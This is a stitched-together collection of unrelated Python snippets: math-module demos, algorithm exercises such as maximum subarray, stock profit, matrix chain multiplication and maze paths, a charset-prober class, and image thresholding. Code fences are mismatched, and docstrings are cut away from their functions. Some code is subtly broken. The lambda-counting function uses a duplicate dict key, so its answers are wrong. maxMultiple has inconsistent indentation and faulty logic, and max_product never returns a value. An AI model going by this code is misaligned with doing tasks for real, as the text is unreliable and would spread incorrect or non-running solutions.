    'i', 'x', 'accurate', 'inaccurate', 'mismatch',
))
print('{:-^2} {:-^12} {:-^10} {:-^20} {:-^8}'.format(
    '', '', '', '', '',
))

for i in range(0, 10):
    x = math.pow(10, i)
    accurate = math.log10(x)
    inaccurate = math.log(x, 10)
    match = '' if int(inaccurate) == i else '*'
    print('{:2d} {:12.1f} {:10.8f} {:20.18f} {:^5}'.format(
        i, x, accurate, inaccurate, match,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyLogarithms close to zero.```


```py

#end_pymotw_header
import math

x = 0.0000000000000000000000001
print('x       :', x)
print('1 + x   :', 1 + x)
print('log(1+x):', math.log(1 + x))
print('log1p(x):', math.log1p(x))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pylog10 example```


```py

#end_pymotw_header
import math

print('{:>2} {:^5} {:^5}'.format(
    'i', 'x', 'log2',
))
print('{:-^2} {:-^5} {:-^5}'.format(
    '', '', '',
))

for i in range(0, 10):
    x = math.pow(2, i)
    result = math.log2(x)
    print('{:2d} {:5.1f} {:5.1f}'.format(
        i, x, result,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySplit fractional from whole number part.```


```py

#end_pymotw_header
import math

for i in range(6):
    print('{}/2 = {}'.format(i, math.modf(i / 2.0)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyOverflowError```


```py

#end_pymotw_header
x = 10.0 ** 200

print('x    =', x)
print('x*x  =', x * x)
print('x**2 =', end=' ')
try:
    print(x ** 2)
except OverflowError as err:
    print(err)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExponentiation```


```py

#end_pymotw_header
import math

INPUTS = [
    # Typical uses
    (2, 3),
    (2.1, 3.2),

    # Always 1
    (1.0, 5),
    (2.0, 0),

    # Not-a-number
    (2, float('nan')),

    # Roots
    (9.0, 0.5),
    (27.0, 1.0 / 3),
]

for x, y in INPUTS:
    print('{:5.1f} ** {:5.3f} = {:6.3f}'.format(
        x, y, math.pow(x, y)))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyConverting from degrees to radians.```


```py

#end_pymotw_header
import math

print('{:^7} {:^7} {:^7}'.format(
    'Degrees', 'Radians', 'Expected'))
print('{:-^7} {:-^7} {:-^7}'.format(
    '', '', ''))

INPUTS = [
    (0, 0),
    (30, math.pi / 6),
    (45, math.pi / 4),
    (60, math.pi / 3),
    (90, math.pi / 2),
    (180, math.pi),
    (270, 3 / 2.0 * math.pi),
    (360, 2 * math.pi),
]

for deg, expected in INPUTS:
    print('{:7d} {:7.2f} {:7.2f}'.format(
        deg,
        math.radians(deg),
        expected,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pySquare roots```


```py

#end_pymotw_header
import math

print(math.sqrt(9.0))
print(math.sqrt(3))
try:
    print(math.sqrt(-1))
except ValueError as err:
    print('Cannot compute sqrt(-1):', err)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyBasic trigonometric functions```


```py

#end_pymotw_header
import math

print('{:^7} {:^7} {:^7} {:^7} {:^7}'.format(
    'Degrees', 'Radians', 'Sine', 'Cosine', 'Tangent'))
print('{:-^7} {:-^7} {:-^7} {:-^7} {:-^7}'.format(
    '-', '-', '-', '-', '-'))

fmt = '{:7.2f} {:7.2f} {:7.2f} {:7.2f} {:7.2f}'

for deg in range(0, 361, 30):
    rad = math.radians(deg)
    if deg in (90, 270):
        t = float('inf')
    else:
        t = math.tan(rad)
    print(fmt.format(deg, rad, math.sin(rad), math.cos(rad), t))

# maths sucks make it cool with python
# math operators

# INTEGERS
# integers are whole numbers positive or negative
# + operator adds numbers
add = 24 + 1004
# - operator subtracts second number from First
subtract = 546 - 132
# * multiplies numbers
multiply = 90 * 4
# / divides numbers
divide = 36 / 6
# returns the remainder of the division
modulo = 17 % 3

# FLOAT
# floats are decimal point numbers positive or negative
addFloat = 24.5 + 1004.005
subtractFloat = 546.90 - 132.56
multiplyFloat = 90.0 * 4.2
divideFloat = 36.6 / 6.6
moduloFloat = 17.0 % 3.0

# all operators work same on both floats or integers

from __future__ import print_function

import sys
'''
Dynamic Programming
Implementation of Matrix Chain Multiplication
Time Complexity: O(n^3)
Space Complexity: O(n^2)
'''
def MatrixChainOrder(array):
    N=len(array)
    Matrix=[[0 for x in range(N)] for x in range(N)]
    Sol=[[0 for x in range(N)] for x in range(N)]
    for i in range(1,N):
        Matrix[i][i]=0

    for ChainLength in range(2,N):
        for a in range(1,N-ChainLength+1):
            b = a+ChainLength-1

            Matrix[a][b] = sys.maxsize
            for c in range(a , b):
                cost = Matrix[a][c] + Matrix[c+1][b] + array[a-1]*array[c]*array[b]
                if cost < Matrix[a][b]:
                    Matrix[a][b] = cost
                    Sol[a][b] = c
    return Matrix , Sol
#Print order of matrix with Ai as Matrix
def PrintOptimalSolution(OptimalSolution,i,j):
    if i==j:
        print("A" + str(i),end = " ")
    else:
        print("(",end = " ")
        PrintOptimalSolution(OptimalSolution,i,OptimalSolution[i][j])
        PrintOptimalSolution(OptimalSolution,OptimalSolution[i][j]+1,j)
        print(")",end = " ")

def main():
    array=[30,35,15,5,10,20,25]
    n=len(array)
    #Size of matrix created from above array will be
    # 30*35 35*15 15*5 5*10 10*20 20*25
    Matrix , OptimalSolution = MatrixChainOrder(array)

    print("No. of Operation required: "+str((Matrix[1][n-1])))
    PrintOptimalSolution(OptimalSolution,1,n-1)
if __name__ == '__main__':
    main()

def matrixElementsSum(matrix):
    runningsum = 0
    for i in range(len(matrix)):
        for j in range(len(matrix[i])):
            if matrix[i][j] == 0 and i + 1 < len(matrix):
                matrix[i + 1][j] = 0
            runningsum += matrix[i][j]
    return runningsum
````

```pyMatrix Exponentiation"""

import timeit
```

````py
Matrix Exponentiation is a technique to solve linear recurrences in logarithmic time.
You read more about it here:
http://zobayer.blogspot.com/2010/11/matrix-exponentiation.html
https://www.hackerearth.com/practice/notes/matrix-exponentiation-1/```


```py


class Matrix:
    def __init__(self, arg):
        if isinstance(arg, list):  # Initializes a matrix identical to the one provided.
            self.t = arg
            self.n = len(arg)
        else:  # Initializes a square matrix of the given size and set values to zero.
            self.n = arg
            self.t = [[0 for _ in range(self.n)] for _ in range(self.n)]

    def __mul__(self, b):
        matrix = Matrix(self.n)
        for i in range(self.n):
            for j in range(self.n):
                for k in range(self.n):
                    matrix.t[i][j] += self.t[i][k] * b.t[k][j]
        return matrix


def modular_exponentiation(a, b):
    matrix = Matrix([[1, 0], [0, 1]])
    while b > 0:
        if b & 1:
            matrix *= a
        a *= a
        b >>= 1
    return matrix


def fibonacci_with_matrix_exponentiation(n, f1, f2):
    # Trivial Cases
    if n == 1:
        return f1
    elif n == 2:
        return f2
    matrix = Matrix([[1, 1], [1, 0]])
    matrix = modular_exponentiation(matrix, n - 2)
    return f2 * matrix.t[0][0] + f1 * matrix.t[0][1]


def simple_fibonacci(n, f1, f2):
    # Trivial Cases
    if n == 1:
        return f1
    elif n == 2:
        return f2

    fn_1 = f1
    fn_2 = f2
    n -= 2

    while n > 0:
        fn_1, fn_2 = fn_1 + fn_2, fn_1
        n -= 1

    return fn_1


def matrix_exponentiation_time():
    setup = """
from random import randint
from __main__ import fibonacci_with_matrix_exponentiation```


```py
    code = "fibonacci_with_matrix_exponentiation(randint(1,70000), 1, 1)"
    exec_time = timeit.timeit(setup=setup, stmt=code, number=100)
    print("With matrix exponentiation the average execution time is ", exec_time / 100)
    return exec_time


def simple_fibonacci_time():
    setup = """
from random import randint
from __main__ import simple_fibonacci```


```py
    code = "simple_fibonacci(randint(1,70000), 1, 1)"
    exec_time = timeit.timeit(setup=setup, stmt=code, number=100)
    print(
        "Without matrix exponentiation the average execution time is ", exec_time / 100
    )
    return exec_time


def main():
    matrix_exponentiation_time()
    simple_fibonacci_time()


if __name__ == "__main__":
    main()

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Finds the maximum number
# in un-sorted data

# Sudo Algo:
# Iterate through data
# each time a number(say k) greater than, previous
# consideration(say p) is found, replace previous
# consideration(p) with that greater number(k)
# By this way,
#  At last we get the maximum number from data


def max_(seq):
    max_n = seq[0]
    for item in seq[1:]:
        if item > max_n:
            max_n = item
    return max_n


# Test
# Add your tests too!
tests = [
    [9017289, 782367, 736812903, 9367821, 71256716278, 676215, 2398, 0, 1],
    [19208, 9239, 4376, 738, 78, 51, 5, 6, 12, 78, 123, 65765, 1999999999],
    [1, 2, 4, 7, 9],
]

# checking our functions results
# with python's built-in max() function
for test_i in range(len(tests)):
    m = max_(tests[test_i])
    if m == max(tests[test_i]):
        print("Max number in array({}) -> ".format(test_i + 1) + str(m))
    else:
        print("Oops! Someting went wrong!")

# Given a string text, you need to use the characters of text to form as many instances of the word "lambda" as possible.

# You can use each character in text at most once.

# Write a function that returns the maximum number of instances of "lambda" that can be formed.
# Input: text = "mbxcdatlas"
# Output: 1
# Example 2:

# Input: text = "lalaaxcmbdtsumbdav"
# Output: 2
# Example 3:

# Input: text = "sctlamb"
# Output: 0
# Notes:

# text consists of lowercase English characters only
# [execution time limit] 4 seconds (py3)

# [input] string text

# [output] integer


def csMaxNumberOfLambdas(text):
    sub_string = "lambda"
    lambda_count = {"l": 0, "a": 0, "m": 0, "b": 0, "d": 0, "a": 0}
    counts = []
    for letter in text:
        if letter in lambda_count:
            lambda_count[letter] += 1
    for key, value in lambda_count.items():
        counts.append(value)
    return min(counts)

def maxSubarray(A):
    # A: inputArray
    # m: Max
    #
    #
    m = e = 0
    for i in A:
        e += i
        if e < 0:
            e = 0
        if m < e:
            m = e
    return m

import string


def lower_(arr):
    """
 For conversion of every element in list to lower
 """
    for i in range(len(arr)):
        arr[i] = arr[i].lower()


def max_alphabetical_order(s):
    """
 Useful on lists containing strings that start from alphabets,
 because the algorithm is written for it in the first place!
 """
    copy = s[:]
    useful = list(string.ascii_lowercase)
    lower_(s)
    res = s[0]
    for word in s[1:]:
        tmp = word[0]
        if useful.index(tmp) > useful.index(res[0]):
            res = word
    return copy[s.index(res)]


# Test
case1 = ["Alpha", "Beta", "Gist", "exotic", "hells kitchen", "word", "Ultra", "zip"]
call = max_alphabetical_order(case1)
print("Max element in list by alphabet order:\n" + call)

def max_difference(a: list[int]) -> tuple[int, int]:
    """
    We are given an array A[1..n] of integers, n >= 1. We want to
    find a pair of indices (i, j) such that
    1 <= i <= j <= n and A[j] - A[i] is as large as possible.

    Explanation:
    https://www.geeksforgeeks.org/maximum-difference-between-two-elements/

    >>> max_difference([5, 11, 2, 1, 7, 9, 0, 7])
    (1, 9)
    """
    # base case
    if len(a) == 1:
        return a[0], a[0]
    else:
        # split A into half.
        first = a[: len(a) // 2]
        second = a[len(a) // 2 :]

        # 2 sub problems, 1/2 of original size.
        small1, big1 = max_difference(first)
        small2, big2 = max_difference(second)

        # get min of first and max of second
        # linear time
        min_first = min(first)
        max_second = max(second)

        # 3 cases, either (small1, big1),
        # (min_first, max_second), (small2, big2)
        # constant comparisons
        if big2 - small2 > max_second - min_first and big2 - small2 > big1 - small1:
            return small2, big2
        elif big1 - small1 > max_second - min_first:
            return small1, big1
        else:
            return min_first, max_second


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Maximum Difference Sub-Linked List

Given a linked list of integers, find and return the sub-linked list of k consecutive elements where
the difference between the smallest element and the largest element is the largest possible.
If there are several sub-linked lists of k elements in items so that all these sub-linked list have
the same largest possible difference, return the sub-linked list that occurs first.

Input: 42 -> 17 -> 99 -> 12 -> 65 -> 77 -> 11 -> 26, 5
Output: 99 -> 12 -> 65 -> 77 -> 11

=========================================
Using 2 pointers (start and end), traverse the linked list and compare the results.
But first, move the end pointer for k places.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############

# import ListNode class from ll_helpers.py
from ll_helpers import ListNode


def max_diference_subll(ll, k):
    if ll is None:
        return None

    start, end = ll, ll

    # move the end pointer for k-1 places
    for i in range(1, k):
        end = end.next
        if end is None:
            return None

    result_start, result_end = start, end

    while end is not None:
        # compare the result with the current sub-linked list
        if abs(result_start.val - result_end.val) < abs(start.val - end.val):
            result_start, result_end = start, end

        # move the both pointers
        start = start.next
        end = end.next

    # cut the original linked list
    result_end.next = None
    return result_start


###########
# Testing #
###########

# import build_ll and print_ll methods from ll_helpers.py
from ll_helpers import build_ll, print_ll

# Test 1
# Correct result => 99 -> 12 -> 65 -> 77 -> 11
print_ll(max_diference_subll(build_ll([42, 17, 99, 12, 65, 77, 11, 26]), 5))

# Test 2
# Correct result => 14 -> 58 -> 11 -> 63 -> 77
print_ll(max_diference_subll(build_ll([36, 14, 58, 11, 63, 77, 46, 32, 87]), 5))

class Heap:
    def __init__(self):
        self.storage = []

    def insert(self, value):
        pass

    def delete(self):
        pass

    def get_max(self):
        pass

    def get_size(self):
        pass

    def _bubble_up(self, index):
        pass

    def _sift_down(self, index):
        pass

def find_max(arr, l):
    temp = arr[0]
    for i in range(l):
        if temp < arr[i]:
            temp = arr[i]
    return temp


arr = [1, 2, 3, 4, 5, 6, 55, 6, 7, 8, 8, 8]

max = find_max(arr, len(arr))
print(max)


def  compare(li):
 res = 0
 for i in range(len(li) - 1):
  a = li[i]
  b = li[i + 1]
  if (a > b):
   if (a > res):
    res = a
  else:
   if (b > res):
    res = b
 return res

def convert():
 get_input = raw_input("Enter Space Seperated Numbers : ")
 raw = get_input.split()
 nums = []
 for i in raw:
  nums.append(float(i))
 return nums

if __name__ == "__main__":
 print compare(convert())
def maxMultiple(divisor, bound):
 """
 Return number n that is greater than 0, less than
 or equal to bound and divisible by divisor
 """
    number = 0
    while number <= bound and number % divisor == 0:
        number += divisor
    number -= divisor
    return number
# Video Explanation: https://www.youtube.com/watch?v=6w60Zi1NtL8&feature=emb_logo

from __future__ import annotations


def maximum_non_adjacent_sum(nums: list[int]) -> int:
    """
    Find the maximum non-adjacent sum of the integers in the nums input list

    >>> print(maximum_non_adjacent_sum([1, 2, 3]))
    4
    >>> maximum_non_adjacent_sum([1, 5, 3, 7, 2, 2, 6])
    18
    >>> maximum_non_adjacent_sum([-1, -5, -3, -7, -2, -2, -6])
    0
    >>> maximum_non_adjacent_sum([499, 500, -3, -7, -2, -2, -6])
    500
    """
    if not nums:
        return 0
    max_including = nums[0]
    max_excluding = 0
    for num in nums[1:]:
        max_including, max_excluding = (
            max_excluding + num,
            max(max_including, max_excluding),
        )
    return max(max_excluding, max_including)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

```pyA script to demonstrate recursion in Python.
The script shows a recursive function to check
how many available paths there are from a given
starting point to the end of the maze,
the most bottem-right cell."""

# Check if cell is valid or not
def valid_cell(x, y):
    return not (x < 0 or y < 0 or x >= length or y >= length)


# Main recursion function
def count_valid_paths(maze, x, y, checked, paths):
    # Base case, if "end" is found, increment by 1
    if x == length - 1 and y == length - 1:
        return paths + 1

    checked[x][y] = True

    # If the current cell is valid and open
    # we start recursing all posible directions
    if valid_cell(x, y) and maze[x][y] == 1:
        if x + 1 < length and not checked[x + 1][y]:
            paths = count_valid_paths(maze, x + 1, y, checked, paths)

        if x - 1 >= 0 and not checked[x - 1][y]:
            paths = count_valid_paths(maze, x - 1, y, checked, paths)

        if y + 1 < length and not checked[x][y + 1]:
            paths = count_valid_paths(maze, x, y + 1, checked, paths)

        if y - 1 >= 0 and not checked[x][y - 1]:
            paths = count_valid_paths(maze, x, y - 1, checked, paths)

    # Backtrack from the cell and mark it as checked
    checked[x][y] = False
    return paths


# Driver code, the 2D array represents the maze
# 1 is open space, 0 is closed
if __name__ == "__main__":

    maze = [[1, 1, 1, 1], [1, 1, 0, 1], [0, 1, 0, 1], [1, 1, 1, 1]]

    length = len(maze)

    # counter for the paths
    paths = 0

    # Create 2D matrix to keep track of cells visited
    checked = [[False for x in range(length)] for y in range(length)]

    paths = count_valid_paths(maze, 0, 0, checked, paths)

    print(
        "There are " + str(paths) + " paths through the maze"
    )  # Should print 4 initially
```

````py
Find the contiguous subarray within an array
(containing at least one number) which has the largest product.

For example, given the array [2,3,-2,4],
the contiguous subarray [2,3] has the largest product = 6.```


```py
from functools import reduce


def max_product(nums):
    """
    :type nums: List[int]
    :rtype: int
    """
    lmin = lmax = gmax = nums[0]
    for i in range(len(nums)):
        t1 = nums[i] * lmax
        t2 = nums[i] * lmin
        lmax = max(max(t1, t2), nums[i])
        lmin = min(min(t1, t2), nums[i])
        gmax = max(gmax, lmax)

````

````py
Another approach that would print max product and the subarray

Examples:
subarray_with_max_product([2,3,6,-1,-1,9,5])
    #=> max_product_so_far: 45, [-1, -1, 9, 5]
subarray_with_max_product([-2,-3,6,0,-7,-5])
    #=> max_product_so_far: 36, [-2, -3, 6]
subarray_with_max_product([-4,-3,-2,-1])
    #=> max_product_so_far: 24, [-4, -3, -2, -1]
subarray_with_max_product([-3,0,1])
    #=> max_product_so_far: 1, [1]```


```py


def subarray_with_max_product(arr):
    """ arr is list of positive/negative numbers """
    l = len(arr)
    product_so_far = max_product_end = 1
    max_start_i = 0
    so_far_start_i = so_far_end_i = 0
    all_negative_flag = True

    for i in range(l):
        max_product_end *= arr[i]
        if arr[i] > 0:
            all_negative_flag = False

        if max_product_end <= 0:
            max_product_end = arr[i]
            max_start_i = i

        if product_so_far <= max_product_end:
            product_so_far = max_product_end
            so_far_end_i = i
            so_far_start_i = max_start_i

    if all_negative_flag:
        print("max_product_so_far: %s, %s" % (reduce(lambda x, y: x * y, arr), arr))
    else:
        print(
            "max_product_so_far: %s, %s"
            % (product_so_far, arr[so_far_start_i : so_far_end_i + 1])
        )

def maxProduct(nums):
    max_so_far = nums[0]
    curr_max = max_so_far
    for i in range(1, len(nums)):
        curr_max *= nums[i]
        if curr_max < nums[i]:
            curr_max = nums[i]
        if curr_max > max_so_far:
            max_so_far = curr_max
    return max_so_far


print(maxProduct([2, -10, -2, -4, 3]))
````

````py
Max Profit (Best Time to Buy and Sell Stock)

Say you have an array for which the ith element is the price of a given stock on day i.
Design an algorithm to find the maximum profit. You may complete as many transactions as you like
(i.e., buy one and sell one share of the stock multiple times).
Note: You may not engage in multiple transactions at the same time
(i.e., you must sell the stock before you buy again).

Input: [7, 1, 5, 3, 6, 4]
Output: 7
Output explanation: Buy on day 2 (price = 1) and sell on day 3 (price = 5), profit = 5-1 = 4.
                    Then buy on day 4 (price = 3) and sell on day 5 (price = 6), profit = 6-3 = 3.

Input: [1, 2, 3, 4, 5]
Output: 4
Output explanation: Buy on day 1 (price = 1) and sell on day 5 (price = 5), profit = 5-1 = 4.
                    Or buy day 1 -> sell day 2, buy day 2 -> sell day 3, buy day 3 -> sell day 4, buy day 4 -> sell day 5.
                    Note that you cannot buy on day 1, buy on day 2 and sell them later, as you are
                    engaging multiple transactions at the same time. You must sell before buying again.

=========================================
Sum only the positive differences between neighbouring elements.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def max_profit(prices):
    total = 0

    for i in range(1, len(prices)):
        total += max(0, prices[i] - prices[i - 1])

    return total


###########
# Testing #
###########

# Test 1
# Correct result => 7
print(max_profit([7, 1, 5, 3, 6, 4]))

# Test 2
# Correct result => 5
print(max_profit([1, 2, 3, 4, 5]))

# Test 3
# Correct result => 0
print(max_profit([7, 6, 4, 3, 1]))
````

````py
Max Profit With K Transactions

You are given an array of integers representing the prices of a single stock on various days
(each index in the array represents a different day).
You are also given an integer k, which represents the number of transactions you are allowed to make.
One transaction consists of buying the stock on a given day and selling it on another, later day.
Write a function that returns the maximum profit that you can make buying and selling the stock,
given k transactions. Note that you can only hold 1 share of the stock at a time; in other words,
you cannot buy more than 1 share of the stock on any given day, and you cannot buy a share of the
stock if you are still holding another share.
In a day, you can first sell a share and buy another after that.

Input: [5, 11, 3, 50, 60, 90], 2
Output: 93
Output explanation: Buy 5, Sell 11; Buy 3, Sell 90

=========================================
Optimized dynamic programming solution.
For this solution you'll need only the current and previous rows.
The original (not optimized) DP formula is: MAX(dp[t][d-1], price[d] + MAX(dp[t-1][x] - price[x])),
but this is O(K * N^2) Time Complexity, and O(N * K) space complexity.
    Time Complexity:    O(N * К)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

import math


def max_profit_with_k_transactions(prices, k):
    days = len(prices)
    if days < 2:
        # not enough days for a transaction
        return 0

    # transaction = buy + sell (2 separate days)
    # in a day you can sell and after that buy a share
    # (according to this, can't exists more transactions than the number of the prices/days)
    k = min(k, days)
    # create space optimized dp matrix
    dp = [[0 for j in range(days)] for i in range(2)]

    for t in range(k):
        max_prev = -math.inf

        # compute which row is previous and which is the current one
        prev_idx = (t - 1) % 2
        curr_idx = t % 2

        # the values in dp table for these days will be same
        # just ignore them, don't update them (because those combinations were tried)
        past_days = t
        # only save the last one
        dp[curr_idx][past_days] = dp[prev_idx][past_days]

        for d in range(past_days + 1, days):
            # first try to buy with the current price
            max_prev = max(max_prev, dp[prev_idx][d - 1] - prices[d - 1])
            # after that try to sell with the current price
            dp[curr_idx][d] = max(dp[curr_idx][d - 1], max_prev + prices[d])

    # return the last value from the last transaction
    return dp[(k - 1) % 2][-1]


###########
# Testing #
###########

# Test 1
# Correct result => 9
print(max_profit_with_k_transactions([1, 2, 3, 4, 5, 6, 7, 8, 9, 10], 10))

# Test 2
# Correct result => 93
print(max_profit_with_k_transactions([5, 11, 3, 50, 60, 90], 2))

def maxSubArray(arr):
    """
    return the max value of any subarray in the given array
    """
    max_so_far = arr[0]
    curr_max = max_so_far
    for i in range(1, len(arr)):
        curr_max += arr[i]
        if curr_max < arr[i]:
            curr_max = arr[i]
        if curr_max > max_so_far:
            max_so_far = curr_max
    return max_so_far


print(maxSubArray([-2, 1, -3, 4, -1, 1, 2, -5, 4]))

def max_subarray(array):
    max_so_far = max_now = array[0]
    for i in range(1, len(array)):
        max_now = max(array[i], max_now + array[i])
        max_so_far = max(max_so_far, max_now)
    return max_so_far


a = [1, 2, -3, 4, 5, -7, 23]
print(a)
print(max_subarray(a))
````

````py
Maximum subarray sum

The subarray must be contiguous.

Sample input: [-2, -3, 4, -1, -2, 1, 5, -3]
Sample output: 7
Output explanation: [4, -1, -2, 1, 5]

=========================================
Need only one iteration, in each step add the current element to the current sum.
When the sum is less than 0, reset the sum to 0 and continue with adding. (we care only about non-negative sums)
After each addition, check if the current sum is greater than the max sum. (Called Kadane's algorithm)
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def max_subarray_sum(a):
    curr_sum = 0
    max_sum = 0

    for val in a:
        # extend the current sum with the curren value;
        # reset it to 0 if it is smaller than 0, we care only about non-negative sums
        curr_sum = max(0, curr_sum + val)

        # check if this is the max sum
        max_sum = max(max_sum, curr_sum)

    return max_sum


###########
# Testing #
###########

# Test 1
# Correct result => 7
print(max_subarray_sum([-2, -3, 4, -1, -2, 1, 5, -3]))

# Test 2
# Correct result => 5
print(max_subarray_sum([1, -2, 2, -2, 3, -2, 4, -5]))

# Test 3
# Correct result => 7
print(max_subarray_sum([-2, -5, 6, -2, -3, 1, 5, -6]))

# Test 4
# Correct result => 0
print(max_subarray_sum([-6, -1]))

def max_subarray_sum(nums: list) -> int:
    """
    >>> max_subarray_sum([6 , 9, -1, 3, -7, -5, 10])
    17
    """
    if not nums:
        return 0
    n = len(nums)

    res, s, s_pre = nums[0], nums[0], nums[0]
    for i in range(1, n):
        s = max(nums[i], s_pre + nums[i])
        s_pre = s
        res = max(res, s)
    return res


if __name__ == "__main__":
    nums = [6, 9, -1, 3, -7, -5, 10]
    print(max_subarray_sum(nums))

# Input: arr[] = {1, 20, 2, 10}
# Output: 72


def single_rotation(arr, l):
    temp = arr[0]
    for i in range(l - 1):
        arr[i] = arr[i + 1]
    arr[l - 1] = temp


def sum_calculate(arr, l):
    sum = 0
    for i in range(l):
        sum = sum + arr[i] * (i)
    return sum


def max_finder(arr, l):
    max = arr[0]
    for i in range(l):
        if max < arr[i]:
            max = arr[i]
    maximum = max
    for i in range(l):
        if max == arr[i]:
            temp = i
    index = temp + 1

    for j in range(index):
        single_rotation(arr, len(arr))


arr = [10, 1, 2, 3, 4, 5, 6, 7, 8, 9]
max_finder(arr, len(arr))
result = sum_calculate(arr, len(arr))

print("Max sum is: " + str(result))


# optimized approach

# '''Python program to find maximum value of Sum(i*arr[i])'''

# # returns max possible value of Sum(i*arr[i])
# def maxSum(arr):

#  # stores sum of arr[i]
#  arrSum = 0

#  # stores sum of i*arr[i]
#  currVal = 0

#  n = len(arr)

#  for i in range(0, n):
#   arrSum = arrSum + arr[i]
#   currVal = currVal + (i*arr[i])

#  # initialize result
#  maxVal = currVal

#  # try all rotations one by one and find the maximum
#  # rotation sum
#  for j in range(1, n):
#   currVal = currVal + arrSum-n*arr[n-j]
#   if currVal > maxVal:
#    maxVal = currVal

#  # return result
#  return maxVal

# # test maxsum(arr) function
# arr = [10, 1, 2, 3, 4, 5, 6, 7, 8, 9]
# print("Max sum is: ", maxSum(arr))
````

````py
Given an array of integer elements and an integer 'k', we are required to find the
maximum sum of 'k' consecutive elements in the array.

Instead of using a nested for loop, in a Brute force approach we will use a technique
called 'Window sliding technique' where the nested loops can be converted to a single
loop to reduce time complexity.```


```py
from typing import List


def max_sum_in_array(array: List[int], k: int) -> int:
    """
    Returns the maximum sum of k consecutive elements
    >>> arr = [1, 4, 2, 10, 2, 3, 1, 0, 20]
    >>> k = 4
    >>> max_sum_in_array(arr, k)
    24
    >>> k = 10
    >>> max_sum_in_array(arr,k)
    Traceback (most recent call last):
        ...
    ValueError: Invalid Input
    >>> arr = [1, 4, 2, 10, 2, 13, 1, 0, 2]
    >>> k = 4
    >>> max_sum_in_array(arr, k)
    27
    """
    if len(array) < k or k < 0:
        raise ValueError("Invalid Input")
    max_sum = current_sum = sum(array[:k])
    for i in range(len(array) - k):
        current_sum = current_sum - array[i] + array[i + k]
        max_sum = max(max_sum, current_sum)
    return max_sum


if __name__ == "__main__":
    from doctest import testmod
    from random import randint

    testmod()
    array = [randint(-1000, 1000) for i in range(100)]
    k = randint(0, 110)
    print(f"The maximum sum of {k} consecutive elements is {max_sum_in_array(array,k)}")
````

````py
Find shortest path from top left column to the right lowest column using DFS.
only step on the columns whose value is 1
if there is no path, it returns -1
(The first column(top left column) is not included in the answer.)

Ex 1)
If maze is
[[1,0,1,1,1,1],
 [1,0,1,0,1,0],
 [1,0,1,0,1,1],
 [1,1,1,0,1,1]],
the answer is: 14

Ex 2)
If maze is
[[1,0,0],
 [0,1,1],
 [0,1,1]],
the answer is: -1```


```py


def find_path(maze):
    cnt = dfs(maze, 0, 0, 0, -1)
    return cnt


def dfs(maze, i, j, depth, cnt):
    directions = [(0, -1), (0, 1), (-1, 0), (1, 0)]

    row = len(maze)
    col = len(maze[0])

    if i == row - 1 and j == col - 1:
        if cnt == -1:
            cnt = depth
        else:
            if cnt > depth:
                cnt = depth
        return cnt

    maze[i][j] = 0

    for k in range(len(directions)):
        nx_i = i + directions[k][0]
        nx_j = j + directions[k][1]

        if nx_i >= 0 and nx_i < row and nx_j >= 0 and nx_j < col:
            if maze[nx_i][nx_j] == 1:
                cnt = dfs(maze, nx_i, nx_j, depth + 1, cnt)

    maze[i][j] = 1

    return cnt

######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .cp949prober import CP949Prober
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super(MBCSGroupProber, self).__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
        ]
        self.reset()

# Add path, encoding

import math


# Geometric Mean:
# Calculates the geometric mean of
# two numbers
# formula: f(x, y) = square_root(x*y)

geoMean = lambda x, y: math.sqrt(x * y)


while True:
    if input("Start [Y/n]?  ").strip().lower() == "y":
        print(
            " [Res] = "
            + str(geoMean(float(input("\nX? ")), float(input("Y? "))))
            + "\n\n"
        )
    else:
        print("\n\nGoodBye!")
        break

from PIL import Image
````

````py
Mean thresholding algorithm for image processing
https://en.wikipedia.org/wiki/Thresholding_(image_processing)```


```py


def mean_threshold(image: Image) -> Image:
    """
    image: is a grayscale PIL image object
    """
    height, width = image.size
    mean = 0
    pixels = image.load()
    for i in range(width):
        for j in range(height):
            pixel = pixels[j, i]
            mean += pixel
    mean //= width * height

    for j in range(width):
        for i in range(height):
            pixels[i, j] = 255 if pixels[i, j] > mean else 0
    return image


if __name__ == "__main__":
    image = mean_threshold(Image.open("path_to_image").convert("L"))
    image.save("output_image_path")

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Median
